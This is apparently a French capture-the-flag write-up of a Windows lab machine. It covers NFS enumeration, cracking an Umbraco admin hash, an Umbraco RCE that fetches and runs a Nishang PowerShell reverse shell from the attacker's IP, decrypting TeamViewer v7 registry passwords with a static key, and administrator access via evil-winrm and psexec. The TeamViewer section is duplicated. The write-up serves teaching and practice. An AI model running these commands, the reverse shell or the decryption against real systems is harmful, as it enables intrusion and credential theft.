![Cover](cover.png)

### 1. Énumération et Scanning

Ma méthodologie débute par un scan complet des ports TCP pour identifier la surface d'attaque. La machine présente un grand nombre de services ouverts, typiques d'un environnement **Windows**, mais avec la présence inhabituelle de **NFS**.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.180

# Scan détaillé des services identifiés
nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 10.10.10.180
```

**Résultats clés :**
*   **Port 21 (FTP) :** **Anonymous login** autorisé, mais le répertoire est vide et non scriptable.
*   **Port 80 (HTTP) :** Serveur **Microsoft HTTPAPI**. Le site web utilise **Umbraco CMS**.
*   **Port 445 (SMB) :** Accès refusé sur les shares habituels.
*   **Port 2049 (NFS) :** Service **nfs** actif, souvent un vecteur de fuite de données sur Windows si mal configuré.

---

### 2. Exploitation du service NFS

Le service **NFS** (Network File System) est rarement exposé sur Windows. J'utilise `showmount` pour vérifier les points de montage disponibles.

```bash
# Énumération des exports NFS
showmount -e 10.10.10.180

# Montage du partage identifié
mount -t nfs 10.10.10.180:/site_backups /mnt/remote_nfs
```

Le partage `/site_backups` est accessible à "everyone". Une fois monté, je découvre l'intégralité de l'arborescence du site web, incluant le répertoire `/App_Data`. Ce dossier contient souvent des bases de données locales. J'y trouve `Umbraco.sdf`, une base de données **SQL Server Compact Edition (SQL CE)**.

> **Schéma Mental : De l'exposition NFS à l'exfiltration de credentials**
> NFS (Accès anonyme) -> Backup du site web -> Analyse de la base de données locale (.sdf) -> Extraction de hashes d'utilisateurs CMS.

---

### 3. Extraction et Crackage de Hash

L'analyse des chaînes de caractères (`strings`) dans le fichier binaire `.sdf` permet d'isoler des informations sur les utilisateurs du CMS **Umbraco**.

```bash
strings /mnt/remote_nfs/App_Data/Umbraco.sdf | grep -i "admin"
```

Je récupère un hash **SHA1** pour l'utilisateur `admin@htb.local` : `b8be16afba8c314ad33d812f22a04991b90e2aaa`.

```bash
# Crackage du hash avec Hashcat (Mode 100 pour SHA1)
hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force
```

Le hash est cassé instantanément : `baconandcheese`.

---

### 4. Vecteur d'entrée : Umbraco Authenticated RCE

Avec les identifiants `admin@htb.local` : `baconandcheese`, je me connecte à l'interface d'administration sur `http://10.10.10.180/umbraco`. 

Le CMS **Umbraco** (version 7.12.4 identifiée via les fichiers du backup) est vulnérable à une **Authenticated Remote Code Execution (RCE)** via l'exploitation de fichiers **XSLT** ou de scripts **Macro**. J'utilise un exploit Python ciblant cette vulnérabilité pour injecter un **PowerShell Reverse Shell**.

**Préparation du Payload (Nishang) :**
Je modifie le script `Invoke-PowerShellTcp.ps1` pour inclure l'appel de fonction à la fin et je le sers via un serveur HTTP local.

```powershell
# Ligne ajoutée à la fin de shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443
```

**Exécution de l'exploit :**
Le payload injecté dans l'exploit Umbraco utilise un **PowerShell IEX (Invoke-Expression)** pour télécharger et exécuter mon script en mémoire.

```python
# Payload intégré dans l'exploit RCE
"/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1')"
```

```bash
# Mise en place de l'écouteur
rlwrap nc -lvnp 443
```

Après exécution, j'obtiens un accès initial en tant que **iis apppool\defaultapppool**. Bien que ce compte ait des privilèges restreints, il me permet de lire le flag `user.txt` situé dans `C:\Users\Public\`.

---

### Énumération Post-Exploitation & Identification du Vecteur

Une fois mon accès initial établi en tant que **iis apppool\defaultapppool**, ma priorité est l'énumération des services tournant avec des privilèges élevés ou stockant des secrets. L'examen des processus actifs via `tasklist` révèle une instance de **TeamViewer**, un logiciel de prise de main à distance connu pour ses vulnérabilités de stockage de credentials dans le **Registry**.

```powershell
# Identification du service TeamViewer
tasklist | findstr /i "TeamViewer"

# Vérification de la version installée
ls "C:\Program Files (x86)\TeamViewer"
```

L'existence du répertoire `Version7` confirme une version ancienne, potentiellement vulnérable à l'extraction de mots de passe via des clés de chiffrement statiques.

> **Schéma Mental : Escalade via TeamViewer**
> Processus (TeamViewer) -> Registre (HKLM) -> Extraction de la valeur SecurityPasswordAES -> Déchiffrement (Clé statique connue) -> Credentials Administrateur.

---

### Extraction des Secrets du Registre

Les versions legacy de **TeamViewer** stockent les mots de passe de sécurité sous forme de hashs chiffrés en **AES-128-CBC** dans le **Registry**. Je cible spécifiquement la ruche `HKLM` car elle contient les configurations globales du service.

```powershell
# Navigation vers la clé de registre cible
cd HKLM:\software\wow6432node\teamviewer\version7

# Extraction de toutes les propriétés pour identifier les champs AES
get-itemproperty -path .

# Extraction spécifique des bytes de SecurityPasswordAES
(get-itemproperty -path .).SecurityPasswordAES
```

L'output me fournit une suite d'entiers représentant le **Ciphertext**. Pour obtenir le mot de passe en clair, je dois inverser l'algorithme.

---

### Cryptanalyse & Déchiffrement

La vulnérabilité réside dans l'utilisation d'une **Static Key** et d'un **Static IV** (Initial Vector) par le fournisseur, documentés par la communauté et intégrés dans certains modules **Metasploit**. J'utilise un script Python pour automatiser le déchiffrement en local.

**Paramètres de déchiffrement identifiés :**
*   **Key** : `0602000000a400005253413100040000`
*   **IV** : `0100010067244f436e6762f25ea8d704`

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"Password: {password}")
```

Le résultat me donne le mot de passe : `!R3m0te!`.

---

### Mouvement Latéral & Accès Administrateur

Avec ces credentials, je teste la validité du compte **Administrator** sur le service **SMB** pour confirmer mes privilèges. L'utilisation de **CrackMapExec** permet de vérifier si le flag `Pwn3d!` apparaît, indiquant un accès administratif complet.

```bash
# Vérification des credentials via SMB
crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'
```

La validation réussie me permet de choisir mon vecteur d'accès final. Étant donné que le port 5985 est ouvert, je privilégie **Evil-WinRM** pour obtenir un shell stable et persistant, ou **Impacket** pour une exécution directe.

```bash
# Option 1 : Shell via WinRM (plus stable)
evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180

# Option 2 : Exécution via PSEXEC (système)
psexec.py 'administrator:!R3m0te!@10.10.10.180'

# Option 3 : Exécution via WMIEXEC (furtif)
wmiexec.py 'administrator:!R3m0te!@10.10.10.180'
```

Je termine la phase en récupérant le flag `root.txt` dans le répertoire `C:\Users\Administrator\Desktop`.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois mon accès initial établi en tant que **iis apppool\defaultapppool**, ma priorité est l'énumération des services tiers et des processus tournant avec des privilèges élevés. Sur une machine Windows, les logiciels de gestion à distance sont des cibles de choix.

#### Énumération des Services et Processus
L'exécution de `tasklist` révèle un processus critique : **TeamViewer_Service.exe**. Une inspection du répertoire `C:\Program Files (x86)\TeamViewer` confirme qu'il s'agit de la **Version 7**.

> **Schéma Mental : Exploitation TeamViewer**
> 1. **Identification** : Repérer une version vulnérable ou ancienne de TeamViewer (v7 ici).
> 2. **Extraction** : Interroger la **Registry** pour récupérer les secrets chiffrés.
> 3. **Cryptanalyse** : Utiliser la clé statique connue (Hardcoded Key) pour déchiffrer le mot de passe.
> 4. **Pivot** : Utiliser le mot de passe pour s'authentifier en tant qu'**Administrator**.

#### Extraction des Secrets depuis la Registry
TeamViewer stocke ses configurations, y compris les mots de passe de sécurité, dans la **Registry**. Pour la version 7 (x64), le chemin est `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`.

```powershell
# Extraction de la valeur SecurityPasswordAES
Get-ItemProperty -Path "HKLM:\software\wow6432node\teamviewer\version7" | Select-Object SecurityPasswordAES
```

La sortie me donne une suite d'entiers (byte array) représentant le mot de passe chiffré en **AES-128-CBC**.

#### Déchiffrement du Mot de Passe (Cryptographic Analysis)
Il est de notoriété publique dans la communauté Red Team que les anciennes versions de TeamViewer utilisent une **Static Key** et un **IV** (Initialization Vector) identiques pour toutes les installations. 

**Clé et IV connus :**
- **Key** : `0602000000a400005253413100040000`
- **IV** : `0100010067244f436e6762f25ea8d704`

J'utilise un script Python pour automatiser le déchiffrement :

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"Password found: {password}")
```

Le script me retourne le mot de passe : `!R3m0te!`.

#### Domination Totale
Je vérifie la validité de ce mot de passe pour le compte **Administrator** via **SMB** avec `crackmapexec`.

```bash
# Vérification des privilèges
crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'
```

Le flag `(Pwn3d!)` confirme que je possède les droits d'administration locale. Je peux maintenant obtenir un shell interactif avec **Evil-WinRM** ou **psexec.py**.

```bash
# Accès final via WinRM
evil-winrm -i 10.10.10.180 -u administrator -p '!R3m0te!'
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission de cette machine met en lumière deux failles architecturales majeures :

1.  **Gestion des logiciels tiers (Third-party Software)** : L'installation de logiciels de gestion à distance (TeamViewer, VNC, AnyDesk) élargit considérablement la surface d'attaque. Si ces logiciels ne sont pas mis à jour, ils deviennent des vecteurs d'élévation de privilèges triviaux.
2.  **Cryptographie à clé statique** : L'utilisation d'une **Hardcoded Key** dans un logiciel commercial est une erreur de conception critique. Une fois la clé extraite par rétro-ingénierie, la sécurité de tous les utilisateurs repose uniquement sur l'accès physique ou logique à la **Registry**.
3.  **Hygiène des mots de passe** : Le fait que le mot de passe de l'application TeamViewer soit identique à celui du compte **Administrator** local illustre un manque de segmentation des secrets (**Credential Reuse**), permettant un pivot direct vers le contrôle total du système.

**Recommandation Red Team** : Toujours auditer les clés de registre `HKLM\SOFTWARE` pour les applications non-Microsoft lors de la phase d'énumération post-exploitation.